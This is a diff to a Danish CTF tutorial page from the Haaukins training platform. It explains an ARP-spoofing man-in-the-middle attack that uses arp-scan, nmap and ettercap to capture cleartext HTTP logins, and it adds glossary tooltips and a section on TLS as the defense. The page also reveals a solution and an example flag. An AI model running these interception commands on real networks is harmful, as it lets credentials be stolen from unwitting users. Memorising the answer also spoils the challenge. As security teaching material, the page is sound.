@@ -29,12 +29,12 @@
 <h2>Trin for trin</h2>
 <ol class="steps">
              <li>Find din placering og de andre hosts: <code>ip -br a</code> og
-             <code>sudo arp-scan -I eth0 --localnet</code>.</li>
-             <li>Find hvem der er server: <code>sudo nmap -Pn -sT -p80,21,23 &lt;hosts&gt;</code> — kun login-serveren
+             <code>sudo <span class="gloss" tabindex="0" data-tip="Finder andre hosts på det lokale netsegment via ARP-forespørgsler.">arp-scan</span> -I eth0 --localnet</code>.</li>
+             <li>Find hvem der er server: <code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -sT -p80,21,23 &lt;hosts&gt;</code> — kun login-serveren
              har <code>80/http</code> åben.</li>
              <li>Bliv MITM og lad ettercap dumpe klartekst-logins:
              <pre><code>sudo sysctl -w net.ipv4.ip_forward=1
-sudo ettercap -T -q -i eth0 -M arp:remote /&lt;server-ip&gt;// ///</code></pre></li>
+sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote /&lt;server-ip&gt;// ///</code></pre></li>
              <li>Vent på det periodiske login — ettercap printer brugernavn, password og hele POST-body'en.</li>
              </ol>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
@@ -45,7 +45,13 @@ CONTENT: email=...&amp;fl4g=HKN%7BE3-9Jj-ROzaz%7D&amp;password=...</code></pre>
         <p>Flag (eksempel): <span class="flag">HKN{E3-9Jj-ROzaz}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>HTTP uden TLS sender alt i klartekst — en MITM læser hele POST-requesten.</li><li><code>ettercap -T</code> af-maskerer selv klartekst-logins; flaget lå i et skjult formfelt (<code>fl4g</code>).</li><li>URL-encodede værdier skal afkodes (<code>%7B</code>/<code>%7D</code>).</li></ul>
+<ul><li>HTTP uden TLS sender alt i klartekst, en MITM læser hele POST-requesten.</li><li><code>ettercap -T</code> af-maskerer selv klartekst-logins; flaget lå i et skjult formfelt (<code>fl4g</code>).</li><li>URL-encodede værdier skal afkodes (<code>%7B</code>/<code>%7D</code>).</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Hele angrebet hviler på at du kan placere dig MELLEM to parter på samme netværkssegment. Det
+samme gælder på et åbent WiFi, i et delt LAN eller en hub-lignende cloud-opsætning. Den eneste
+reelle beskyttelse er end-to-end-kryptering (TLS): med HTTPS ville MITM'en kun se krypterede
+bytes. Når du ser en app sende login over ren HTTP, er det altid værd at spørge: hvem ellers kan
+se dette på vejen?</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
